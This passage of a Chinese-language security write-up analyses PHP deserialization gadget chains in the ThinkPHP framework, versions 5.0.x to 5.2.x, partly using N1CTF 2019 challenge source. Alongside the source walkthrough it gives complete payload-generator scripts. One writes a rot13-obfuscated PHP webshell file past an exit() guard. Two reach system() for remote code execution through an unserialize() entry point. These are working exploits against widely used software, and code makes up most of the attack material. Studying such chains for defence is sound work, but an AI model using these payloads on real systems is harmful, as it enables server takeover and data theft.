        parent::close();
        foreach ($this->fileHandles as $handle) {
            fclose($handle);
        }
        $this->fileHandles = [];
    }
    private function removeFiles()
    {
        foreach ($this->files as $filename) {
            if (file_exists($filename)) {
                @unlink($filename);
            }
        }
        $this->files = [];
    }
#thinkphp/library/think/process/pipes/Pipes.php
    public function close()#parent
    {
        foreach ($this->pipes as $pipe) {
            fclose($pipe);
        }
        $this->pipes = [];
    }

```

注意到存在`file_exists`,这个函数只接受`string`类型,因此可以利用这个函数调用某个对象的`__toString`方法

2. __toString

`\think\Model::__toString`

```php
#thinkphp/library/think/Model.php
abstract class Model implements \JsonSerializable, \ArrayAccess{
    public function __toString()
    {
        return $this->toJson();
    }
    public function toJson($options = JSON_UNESCAPED_UNICODE)
    {
        return json_encode($this->toArray(), $options);
    }
    public function toArray()
    {
        $item    = [];
        $visible = [];
        $hidden  = [];

        $data = array_merge($this->data, $this->relation);

        // 过滤属性
        if (!empty($this->visible)) {
            ...
        } elseif (!empty($this->hidden)) {
            ...
        }

        foreach ($data as $key => $val) {
            ...
        }
        // 追加属性（必须定义获取器）
        if (!empty($this->append)) {
            foreach ($this->append as $key => $name) {
                if (is_array($name)) {
                    ...
                } elseif (strpos($name, '.')) {
                    ...
                } else {
                    $relation = Loader::parseName($name, 1, false);#字符串命名风格转换
                    if (method_exists($this, $relation)) {
                        $modelRelation = $this->$relation();#可以调用当前类的任意方法
                        #getError()返回$this->error,参数可控
                        $value         = $this->getRelationData($modelRelation);

                        if (method_exists($modelRelation, 'getBindAttr')) {
                            $bindAttr = $modelRelation->getBindAttr();
                            if ($bindAttr) {
                                foreach ($bindAttr as $key => $attr) {
                                    $key = is_numeric($key) ? $attr : $key;
                                    if (isset($this->data[$key])) {
                                        throw new Exception('bind attr has exists:' . $key);
                                    } else {
                                        $item[$key] = $value ? $value->getAttr($attr) : null;
                                    }
                                }
                                continue;
                            }
                        }
                        $item[$name] = $value;
                    } else {
                        $item[$name] = $this->getAttr($name);
                    }
                }
            }
        }
        return !empty($item) ? $item : [];
    }
    public function getError()
    {
        return $this->error;
    }
    protected function getRelationData(Relation $modelRelation)#获取关联模型数据,Relation $modelRelation 模型关联对象
    {
        if ($this->parent && !$modelRelation->isSelfRelation() && get_class($modelRelation->getModel()) == get_class($this->parent)) {
            $value = $this->parent;#满足条件时,$value可控
        } else {
            ...
        }
        return $value;
    }
}

#thinkphp/library/think/model/Relation.php
abstract class Relation
{
    public function isSelfRelation()
    {
        return $this->selfRelation;#false
    }
    public function getModel()
    {
        return $this->query->getModel();
    }
}

#thinkphp/library/think/model/relation/OneToOne.php
abstract class OneToOne extends Relation
{
    public function getBindAttr()
    {
        return $this->bindAttr;
    }
}

#thinkphp/library/think/db/Query.php
class Query
{
    public function getModel()
    {
        return $this->model;
    }
}
```

首先设置下列属性,避免干扰

```php
$this->data = [];
$this->relation = [];
$this->visible = [];
$this->hidden = [];
```

将`$this->append`设置为`array('getError')`从而让`$modelRelation`的内容可控,需要满足`method_exists($modelRelation, 'getBindAttr')`,因此将`$this->error`设置为`\think\model\relation\OneToOne`某个子类的对象

将`$this->parent`与`\think\db\Query::$model`设置为同一对象,使`$value = $this->parent;`,从而使`$value`可控

将`\think\model\relation\OneToOne::$bindAttr`设置为`array(xxx)`,从而使`$attr`可控,最终通过` $value->getAttr($attr)`可以调用任意类的`getAttr`或者`__call`方法且参数可控

3. __call

`\think\console\Output`

```php
#thinkphp/library/think/console/Output.php
    public function __call($method, $args)
    {
        if (in_array($method, $this->styles)) {
            array_unshift($args, $method);
            return call_user_func_array([$this, 'block'], $args);
        }

        if ($this->handle && method_exists($this->handle, $method)) {
            return call_user_func_array([$this->handle, $method], $args);
        } else {
            throw new Exception('method not exists:' . __CLASS__ . '->' . $method);
        }
    }

    protected function block($style, $message)
    {
        $this->writeln("<{$style}>{$message}</$style>");
    }

    public function writeln($messages, $type = self::OUTPUT_NORMAL)
    {
        $this->write($messages, true, $type);
    }

    public function write($messages, $newline = false, $type = self::OUTPUT_NORMAL)
    {
        $this->handle->write($messages, $newline, $type);
    }
```

首先要满足`in_array($method, $this->styles)`,`$method`为`getAttr`,因此需要在`$this->styles`中添加`'getAttr'`

通过`block->writeln->write->$this->handle->write`从而调用任意类的`write`方法,但要注意只有`$messages`可控

4. write

`\think\session\driver\Memcached::write`

```php
#thinkphp/library/think/session/driver/Memcached.php
    public function write($sessID, $sessData)
    {
        return $this->handler->set($this->config['session_name'] . $sessID, $sessData, $this->config['expire']);
    }
```

调用任意类的`set`方法,但要注意只有`$sessID`和`$this->config`可控

5. set

`\think\cache\driver\File::set`

```php
#thinkphp/library/think/cache/driver/File.php
    public function set($name, $value, $expire = null)
    {
        if (is_null($expire)) {
            $expire = $this->options['expire'];
        }
        if ($expire instanceof \DateTime) {
            $expire = $expire->getTimestamp() - time();
        }
        $filename = $this->getCacheKey($name, true);
        if ($this->tag && !is_file($filename)) {
            $first = true;
        }
        $data = serialize($value);
        if ($this->options['data_compress'] && function_exists('gzcompress')) {
            //数据压缩
            $data = gzcompress($data, 3);
        }
        $data   = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
        $result = file_put_contents($filename, $data);
        if ($result) {
            isset($first) && $this->setTagItem($filename);
            clearstatcache();
            return true;
        } else {
            return false;
        }
    }

    protected function getCacheKey($name, $auto = false)
    {
        $name = md5($name);
        if ($this->options['cache_subdir']) {
            // 使用子目录
            $name = substr($name, 0, 2) . DS . substr($name, 2);
        }
        if ($this->options['prefix']) {
            $name = $this->options['prefix'] . DS . $name;
        }
        $filename = $this->options['path'] . $name . '.php';
        $dir      = dirname($filename);

        if ($auto && !is_dir($dir)) {
            mkdir($dir, 0755, true);
        }
        return $filename;
    }

    protected function setTagItem($name)
    {
        if ($this->tag) {
            $key       = 'tag_' . md5($this->tag);
            $this->tag = null;
            if ($this->has($key)) {
                $value   = explode(',', $this->get($key));
                $value[] = $name;
                $value   = implode(',', array_unique($value));
            } else {
                $value = $name;
            }
            $this->set($key, $value, 0);
        }
    }
```

由于`$value`不可控,无法直接控制文件写入的内容,因此需要借助`setTagItem`中的`$this->set($key, $value, 0);`来控制文件写入内容,而`$value = $name;`,`$name`则来源于`getCacheKey`生成的文件名

由于`$this->options`可控,因此可以控制文件名,由此可以控制文件写入的内容

但是注意到在文件写入的内容之前存在`<?php exit();>`,需要进行绕过,这里用到了[死亡绕过的技巧](https://www.freebuf.com/articles/web/266565.html)

利用rot13进行死亡绕过,同时将文件内容写入到缓存中

```php
<?php

namespace think\process\pipes {

    use think\Process;

    class Windows
    {
        private $files;
        private $fileHandles;

        public function __construct(array $files)
        {
            $this->pipes = [];
            $this->fileHandles = [];
            $this->files = $files;
        }
    }
}

namespace think\model {

    use think\Db;
    use think\db\Query;
    use think\Model;

    class Merge
    {
        protected $data;
        protected $relation;
        protected $visible;
        protected $hidden;
        protected $append;
        protected $error;
        protected $parent;

        public function __construct($modelRelation, $output)
        {
            $this->data = [];
            $this->relation = [];
            $this->visible = [];
            $this->hidden = [];
            $this->append = array('getError');
            $this->error = $modelRelation;
            $this->parent = $output;


        }

    }
}

namespace think\model\relation {

    use think\db\Query;
    use think\Loader;
    use think\Model;

    class HasOne
    {

        protected $model;
        protected $selfRelation;
        protected $query;
        protected $bindAttr;

        public function __construct($model, $query, array $bindAttr)
        {
            $this->model = $model;
            $this->selfRelation = false;
            $this->query = $query;
            $this->bindAttr = $bindAttr;
        }
    }
}

namespace think\db {

    use PDO;
    use think\App;
    use think\Cache;
    use think\Collection;
    use think\Config;
    use think\Db;
    use think\db\exception\BindParamException;
    use think\db\exception\DataNotFoundException;
    use think\db\exception\ModelNotFoundException;
    use think\Exception;
    use think\exception\DbException;
    use think\exception\PDOException;
    use think\Loader;
    use think\Model;
    use think\model\Relation;
    use think\model\relation\OneToOne;
    use think\Paginator;

    class Query
    {
        protected $model;

        public function __construct($model)
        {
            $this->model = $model;
        }
    }
}

namespace think\console {

    use Exception;
    use think\console\output\Ask;
    use think\console\output\Descriptor;
    use think\console\output\driver\Buffer;
    use think\console\output\driver\Console;
    use think\console\output\driver\Nothing;
    use think\console\output\Question;
    use think\console\output\question\Choice;
    use think\console\output\question\Confirmation;

    class Output
    {
        protected $styles;
        private $handle;

        public function __construct($handle)
        {
            $this->styles = [
                'info',
                'error',
                'comment',
                'question',
                'highlight',
                'warning',
                'getAttr'
            ];
            $this->handle = $handle;
        }
    }
}

namespace think\session\driver {

    use SessionHandler;
    use think\Exception;

    class Memcached
    {
        protected $handler;

        public function __construct($handler)
        {
            $this->handler = $handler;
        }
    }
}

namespace think\cache\driver {

    use think\cache\Driver;

    class File
    {
        protected $options;
        protected $tag;

        public function __construct()
        {
            $this->options = [
                'expire' => 0,
                'cache_subdir' => false,
                'prefix' => '',
                'path' => 'php://filter/write=string.rot13/resource=<?cuc cucvasb();?>123',
                'data_compress' => false,
            ];
            $this->tag = true;
        }
    }
}
namespace {
    $file = new \think\cache\driver\File();
    $handle = new \think\session\driver\Memcached($file);
    $output = new \think\console\Output($handle);
    $query = new \think\db\Query($output);
    $relation = new \think\model\relation\HasOne($output, $query, array('lksadjflkasd'));
    $model = new \think\model\Merge($relation, $output);
    $s = new \think\process\pipes\Windows(array($model));
    echo "s=" . urlencode(base64_encode(serialize($s)));
}
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204271623083.png)

但是存在一个问题,在浏览器中访问不了???

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204271641357.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204271640167.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204271642163.png)

## 5.1.x版本

5.1.30版本

```php
<?php
namespace app\index\controller;

class Index
{
    public function index()
    {
        $s=input('post.s');
        $s=base64_decode($s);
        unserialize($s);
    }
}
```

1. 反序列化入口

一开始我是打算利用`\think\Process::__destruct`这里作为反序列化入口,想要利用`preg_split`中的反引号内容进行命令注入,但是在`proc_get_status($this->process);`这里要获取由`proc_open()`函数打开的进程的信息,这里没有办法利用反序列化生成,因此放弃这个入口

```php
#thinkphp/library/think/Process.php
    public function __destruct()
    {
        $this->stop();
    }

    public function stop()
    {
        if ($this->isRunning()) {
            if ('\\' === DIRECTORY_SEPARATOR && !$this->isSigchildEnabled()) {
                ...
            } else {
                $pids = preg_split('/\s+/', `ps -o pid --no-heading --ppid {$this->getPid()}`);
                foreach ($pids as $pid) {
                    if (is_numeric($pid)) {
                        posix_kill($pid, 9);
                    }
                }
            }
        }

        $this->updateStatus(false);
        if ($this->processInformation['running']) {
            $this->close();
        }

        return $this->exitcode;
    }

    public function isRunning()
    {
        if (self::STATUS_STARTED !== $this->status) {
            return false;
        }

        $this->updateStatus(false);

        return $this->processInformation['running'];
    }

    protected function updateStatus($blocking)
    {
        if (self::STATUS_STARTED !== $this->status) {
            return;
        }

        $this->processInformation = proc_get_status($this->process);
        $this->captureExitCode();

        $this->readPipes($blocking, '\\' === DIRECTORY_SEPARATOR ? !$this->processInformation['running'] : true);

        if (!$this->processInformation['running']) {
            $this->close();
        }
    }
```

`\think\process\pipes\Windows::__destruct`

```php
#thinkphp/library/think/process/pipes/Windows.php
    public function __destruct()
    {
        $this->close();
        $this->removeFiles();
    }

    public function close()
    {
        parent::close();
        foreach ($this->fileHandles as $handle) {
            fclose($handle);
        }
        $this->fileHandles = [];
    }

    public function close()#parent
    {
        foreach ($this->pipes as $pipe) {
            fclose($pipe);
        }
        $this->pipes = [];
    }

    private function removeFiles()
    {
        foreach ($this->files as $filename) {
            if (file_exists($filename)) {
                @unlink($filename);
            }
        }
        $this->files = [];
    }
```

利用`file_exists`调用`__toString`(跟5.0.x一样)

2. __toString

`\think\model\concern\Conversion::__toString`

```php
#thinkphp/library/think/model/concern/Conversion.php
trait Conversion
{
    public function __toString()
    {
        return $this->toJson();
    }

    public function toJson($options = JSON_UNESCAPED_UNICODE)
    {
        return json_encode($this->toArray(), $options);
    }

    public function toArray()
    {
        $item    = [];
        $visible = [];
        $hidden  = [];

        // 合并关联数据
        $data = array_merge($this->data, $this->relation);

        // 过滤属性
        if (!empty($this->visible)) {
            ...
        } elseif (!empty($this->hidden)) {
            ...
        }

        foreach ($data as $key => $val) {
            ...
        }

        // 追加属性（必须定义获取器）
        if (!empty($this->append)) {
            foreach ($this->append as $key => $name) {
                if (is_array($name)) {
                    // 追加关联对象属性
                    $relation = $this->getRelation($key);#$relation可控

                    if (!$relation) {
                        ...
                    }

                    $item[$key] = $relation->append($name)->toArray();#可以调用任意类的append方法或__call方法且$name可控
                } elseif (strpos($name, '.')) {
                    ...
                }
                ...
            }
        }

        return $item;
    }
}

#thinkphp/library/think/model/concern/RelationShip.php
#\think\model\concern\RelationShip::getRelation
    public function getRelation($name = null)#$name为$this->append的键名
    {
        if (is_null($name)) {
            return $this->relation;
        } elseif (array_key_exists($name, $this->relation)) {
            return $this->relation[$name];#$this->relation可控,因此返回值可控
        }
        return;
    }
```

将`$this->append`设置为`array('misaka' => array());`满足条件`is_array($name)`

此时`$key`为`misaka`,为了使`$relation = $this->getRelation($key);`可控,将`$this->relation`设置为`array('misaka' => 某个类的对象);`通过`$this->relation[$name]`达到可控

`$relation->append($name)`可以调用任意类的`append`方法或`__call`方法且`$name`可控

3. __call

`\think\Request::__call`

```php
    public function __call($method, $args)
    {
        if (array_key_exists($method, $this->hook)) {
            array_unshift($args, $this);
            return call_user_func_array($this->hook[$method], $args);
        }

        throw new Exception('method not exists:' . static::class . '->' . $method);
    }
```

此时的`$method`和`$args`为

```php
$args = {数组} [1]
 0 = {数组} [0]
$method = "append"
```

经过`array_unshift`后,`$args`变更为

```php
$args = {数组} [2]
 0 = {think\Request} [39]
 1 = {数组} [0]
$method = "append"
```

`$this->hook`可控,因此可以利用`call_user_func_array`调用任意方法,但是此时`$args`的第一个参数为`$this`,需要找到一个可以进行RCE且不受第一个参数影响的方法

4. RCE链

`\think\Request::isAjax`

```php
    public function isAjax($ajax = false)
    {
        $value  = $this->server('HTTP_X_REQUESTED_WITH');
        $result = 'xmlhttprequest' == strtolower($value) ? true : false;

        if (true === $ajax) {
            return $result;
        }

        $result           = $this->param($this->config['var_ajax']) ? true : $result;
        $this->mergeParam = false;
        return $result;
    }

    public function param($name = '', $default = null, $filter = '')
    {
        if (!$this->mergeParam) {
            ...
        }

        if (true === $name) {
            // 获取包含文件上传信息的数组
            $file = $this->file();
            $data = is_array($file) ? array_merge($this->param, $file) : $this->param;
            return $this->input($data, '', $default, $filter);
        }
    }

    public function file($name = '')
    {
        if (empty($this->file)) {
            $this->file = isset($_FILES) ? $_FILES : [];
        }

        $files = $this->file;
        if (!empty($files)) {
            ...
        }

        return;
    }

    public function input($data = [], $name = '', $default = null, $filter = '')
    {
        if (false === $name) {
            // 获取原始数据
            return $data;
        }

        $name = (string) $name;
        ...

        // 解析过滤器
        $filter = $this->getFilter($filter, $default);

        if (is_array($data)) {
            array_walk_recursive($data, [$this, 'filterValue'], $filter);
            ...
    }

    protected function getFilter($filter, $default)
    {
        if (is_null($filter)) {
            $filter = [];
        } else {
            $filter = $filter ?: $this->filter;
            if (is_string($filter) && false === strpos($filter, '/')) {
                $filter = explode(',', $filter);
            } else {
                $filter = (array) $filter;
            }
        }

        $filter[] = $default;

        return $filter;
    }

    private function filterValue(&$value, $key, $filters)
    {
        $default = array_pop($filters);

        foreach ($filters as $filter) {
            if (is_callable($filter)) {
                // 调用函数或者方法过滤
                $value = call_user_func($filter, $value);
            ...
    }
```

在`Request`类中有一个`isAjax`方法,在`isAjax`方法中会对`$this->param()`进行调用且参数`$this->config['var_ajax']`可控

在`param`中将`$this->mergeParam`设置为`true`即可跳过干扰项,而由于`$name`为`$this->config['var_ajax']`,因此将`$this->config['var_ajax']`设置为`true`即可满足条件`true === $name`

在`file`中`$files = $this->file;`因此`$files`可控,将`$this->file`设置为空值即可绕过`!empty($files)`使得`param`中的`$file`为`null`

因此`is_array($file)`为`false`,`$data=$this->param`可控,进入到`$this->input()`,此时`$data`参数可控

在`input`中通过`$this->getFilter`获取`$filter`的值,而`$this->filter`可控,因此`$filter`可控

最终进入`filterValue`,利用`call_user_func`达到RCE的目的

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204281633688.png)

payload如下

```php
<?php

namespace think\process\pipes {

    use think\Process;

    class Windows
    {
        private $files;
        public $pipes;
        private $fileHandles;

        public function __construct(array $files)
        {
            $this->fileHandles = [];
            $this->pipes = [];
            $this->files = $files;
        }
    }
}


namespace think\model\concern {

    use think\Collection;
    use think\Exception;
    use think\Loader;
    use think\Model;
    use think\model\Collection as ModelCollection;
    use think\db\Query;
    use think\model\Relation;
    use think\model\relation\BelongsTo;
    use think\model\relation\BelongsToMany;
    use think\model\relation\HasMany;
    use think\model\relation\HasManyThrough;
    use think\model\relation\HasOne;
    use think\model\relation\MorphMany;
    use think\model\relation\MorphOne;
    use think\model\relation\MorphTo;

    trait Conversion
    {
        protected $visible;
        protected $hidden;
        protected $append;
    }

    trait RelationShip
    {
        private $relation;
    }

    trait Attribute
    {
        private $data;
    }
}

namespace think {

    use InvalidArgumentException;
    use think\db\Query;

    class Model
    {
        use model\concern\Attribute;
        use model\concern\RelationShip;
        use model\concern\Conversion;

        public function __construct($relation)
        {
            $this->visible = [];
            $this->hidden = [];
            $this->data = [];
            $this->relation = array('misaka' => $relation);
            $this->append = array('misaka' => array());
        }
    }
}


namespace think\model {

    use think\Model;

    class Pivot extends Model
    {
        public function __construct($relation)
        {
            parent::__construct($relation);
        }
    }
}

namespace think {

    use think\facade\Cookie;
    use think\facade\Session;

    class Request
    {
        protected $hook;
        protected $filter;
        protected $config;
        protected $mergeParam;
        protected $file;
        protected $param;

        public function __construct()
        {
            $this->hook = array('append' => array($this, 'isAjax'));
            $this->filter = 'system';
            $this->mergeParam = true;
            $this->config['var_ajax'] = true;
            $this->file = NULL;
            $this->param =  array('id');
        }
    }
}

namespace {
    $a = new \think\Request();
    $b = new \think\model\Pivot($a);
    $c = new \think\process\pipes\Windows(array($b));
    echo "s=" . urlencode(base64_encode(serialize($c)));
}
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204272234122.png)

## 5.2.x版本

源码来源于N1CTF的[sql_manage](https://github.com/Nu1LCTF/n1ctf-2019/tree/master/WEB/sql_manage/Docker)

`app/controller/Index.php`

```php
<?php

namespace app\controller;

class Index
{
    public function index()
    {
        $s=input('post.s');
        $s=base64_decode($s);
        unserialize($s);
    }
}
```

1. 反序列化入口 

`\think\process\pipes\Windows::__destruct`

```php
#vendor/topthink/framework/src/think/process/pipes/Windows.php
    public function __destruct()
    {
        $this->close();
        $this->removeFiles();
    }

    public function close()
    {
        parent::close();
        foreach ($this->fileHandles as $handle) {
            fclose($handle);
        }
        $this->fileHandles = [];
    }

    public function close()#parent
    {
        foreach ($this->pipes as $pipe) {
            fclose($pipe);
        }
        $this->pipes = [];
    }

    private function removeFiles()
    {
        foreach ($this->files as $filename) {
            if (file_exists($filename)) {
                @unlink($filename);
            }
        }
        $this->files = [];
    }
```

利用`file_exists`调用`__toString`(跟5.0.x一样)

2. __toString

`\think\model\concern\Conversion::__toString`

```php
#vendor/topthink/framework/src/think/model/concern/Conversion.php
trait Conversion
{
    public function __toString()
    {
        return $this->toJson();
    }

    public function toJson(int $options = JSON_UNESCAPED_UNICODE): string
    {
        return json_encode($this->toArray(), $options);
    }

    public function toArray(): array
    {
        $item       = [];
        $hasVisible = false;

        foreach ($this->visible as $key => $val) {
            if (is_string($val)) {
                ...
            }
        }

        foreach ($this->hidden as $key => $val) {
            if (is_string($val)) {
                ...
            }
        }

        // 合并关联数据
        $data = array_merge($this->data, $this->relation);

        foreach ($data as $key => $val) {
            if ($val instanceof Model || $val instanceof ModelCollection) {
                ...
            } elseif (isset($this->visible[$key])) {
                $item[$key] = $this->getAttr($key);
            } elseif (!isset($this->hidden[$key]) && !$hasVisible) {
                $item[$key] = $this->getAttr($key);
            }
        }

        // 追加属性（必须定义获取器）
        foreach ($this->append as $key => $name) {
            $this->appendAttrToArray($item, $key, $name);
        }

        return $item;
    }
}
```

将`$this->visible`和`$this->hidden`中的值设置成非`string`类型,从而绕过`is_string`处理

`$hasVisible`为`false`,因此需要设置`$this->hidden[$key]`从而避免进入`elseif (!isset($this->hidden[$key]) && !$hasVisible)`

最终设置的值为

```php
$this->visible = array('misaka' => array());
$this->hidden = array(0 => array(), 1 => array(), 'misaka' => array());
$this->data = array('system', $payload);
$this->relation = array('misaka' => 'call_user_func');
$this->withAttr = array('misaka' => 'call_user_func_array');
```

传入getattr的参数为`misaka`

```php
#vendor/topthink/framework/src/think/model/concern/Attribute.php
    public function getAttr(string $name)
    {
        try {
            $relation = false;
            $value    = $this->getData($name);
        } catch (InvalidArgumentException $e) {
            $relation = true;
            $value    = null;
        }

        return $this->getValue($name, $value, $relation);
    }

    public function getData(string $name = null)
    {
        if (is_null($name)) {
            return $this->data;
        }

        $fieldName = $this->getRealFieldName($name);#return $this->strict ? $name : App::parseName($name);

        if (array_key_exists($fieldName, $this->data)) {
            return $this->data[$fieldName];
        } elseif (array_key_exists($name, $this->relation)) {
            return $this->relation[$name];
        }
        ...
    }

    protected function getValue(string $name, $value, bool $relation = false)
    {
        // 检测属性获取器
        $fieldName = $this->getRealFieldName($name);#return $this->strict ? $name : App::parseName($name);
        $method    = 'get' . App::parseName($name, 1) . 'Attr';

        if (isset($this->withAttr[$fieldName])) {
            if ($relation) {
                $value = $this->getRelationValue($name);
            }

            $closure = $this->withAttr[$fieldName];
            $value   = $closure($value, $this->data);#任意函数调用 RCE
        }...

        return $value;
    }
```

进入到`\think\model\concern\Attribute::getAttr`后,首先通过`getData`获取`$value`

满足`array_key_exists($name, $this->relation)`,从而将`$value`设置为`$this->relation[$name]`即`call_user_func`

然后进入`getValue`,此时`$fieldName`为`misaka`,`$value`为`call_user_func`,`$relation`为默认值`false`

`$this->withAttr[$fieldName];`为`call_user_func_array`

最终生成的利用形式为`call_user_func_array(call_user_func,array('system', $payload));`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204301815030.png)

payload

```php
<?php

namespace think\process\pipes {

    use think\Process;

    class Windows
    {
        private $files;
        public $pipes;
        private $fileHandles;

        public function __construct(array $files)
        {
            $this->fileHandles = [];
            $this->pipes = [];
            $this->files = $files;
        }
    }
}

namespace think\model\concern {

    trait Conversion
    {
        protected $visible;
        protected $hidden;
        protected $append;
    }

    trait RelationShip
    {
        private $relation;
    }

    trait Attribute
    {
        private $data;
        private $withAttr;
        protected $strict;
    }
}

namespace think {

    use ArrayAccess;
    use JsonSerializable;
    use think\db\Query;
    use think\facade\Db;

    class Model
    {
        use model\concern\Attribute;
        use model\concern\RelationShip;
        use model\concern\Conversion;

        public function __construct($payload)
        {
            $this->visible = array('misaka' => array());
            $this->strict = true;
            $this->hidden = array(0 => array(), 1 => array(), 'misaka' => array());
            $this->data = array('system', $payload);
            $this->relation = array('misaka' => 'call_user_func');
            $this->withAttr = array('misaka' => 'call_user_func_array');
        }
    }
}


namespace think\model {

    use think\Model;

    class Pivot extends Model
    {
        public function __construct($payload)
        {
            parent::__construct($payload);
        }
    }
}

namespace {
    $a = new \think\model\Pivot('id');
    $b = new \think\process\pipes\Windows(array($a));
    echo 's=' . urlencode(base64_encode(serialize($b)));
}
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204301742237.png)